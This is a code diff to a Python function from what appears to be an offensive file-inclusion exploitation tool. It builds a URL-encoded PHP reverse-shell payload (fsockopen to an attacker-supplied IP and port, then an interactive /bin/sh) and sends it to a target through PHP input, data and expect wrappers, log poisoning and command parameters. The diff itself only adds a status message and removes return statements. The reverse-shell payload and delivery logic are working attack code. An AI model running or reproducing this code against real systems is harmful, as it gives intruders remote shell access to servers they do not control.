@@ -4,6 +4,7 @@ from src.utils.encodings import encode
 from src.utils.arguments import args
 from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
+from src.utils import colors
 
 def exploit_php(exploit, method, ip, port):
 
@@ -11,7 +12,9 @@ def exploit_php(exploit, method, ip, port):
     post = exploit['POSTVAL']
 
     phpTest = "which%20php"
-    phpPayload =  "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
+    phpPayload = "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
+
+    print(colors.purple("[?]") + " Checking if php is available on the target system...")
 
     if(method == "INPUT"):
         u = url.replace(config.tempArg, encode(phpTest))
@@ -19,7 +22,7 @@ def exploit_php(exploit, method, ip, port):
         if("/bin" in res.text and "/php" in res.text):
             printInfo(ip, port, "PHP", "input wrapper")
             request.REQUEST(url.replace(config.tempArg, encode(phpPayload)), args.httpheaders, exploit['POSTVAL'], config.proxies, "", "")
-            return True
+
     if(method == "DATA"):
         if(args.mode == "post"):
             res, _ = request.REQUEST(url.replace(config.tempArg, encode(phpTest)), args.httpheaders, post, config.proxies, "", "")
@@ -31,7 +34,7 @@ def exploit_php(exploit, method, ip, port):
                 request.REQUEST(url.replace(config.tempArg, encode(phpPayload)), args.httpheaders, post, config.proxies, "", "")
             else:
                 request.REQUEST(url.replace(config.tempArg, encode(phpPayload)), args.httpheaders, "", config.proxies, "", "")
-            return True
+
     if(method == "EXPECT"):
         if(args.mode == "post"): 
             res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(phpTest)), config.proxies, "", "")
@@ -43,10 +46,9 @@ def exploit_php(exploit, method, ip, port):
                 request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(phpPayload)), config.proxies, "", "")
             else:
                 request.REQUEST(url.replace(config.tempArg, encode(phpPayload)), args.httpheaders, "", config.proxies, "" , "")
-            return True
+
     if(method == "TRUNC"):
         exploit_log_poison(ip, port, url, phpPayload, "", encode(phpTest), "/php", exploit['POSTVAL'])
-        return True
 
     if(method == "CMD"):
         if(args.mode == "post"):
@@ -59,4 +61,3 @@ def exploit_php(exploit, method, ip, port):
                 request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(phpPayload)), config.proxies, "", "")
             else:
                 request.REQUEST(url.replace(config.tempArg, encode(phpPayload)), args.httpheaders, "", config.proxies, "", "")
-            return True
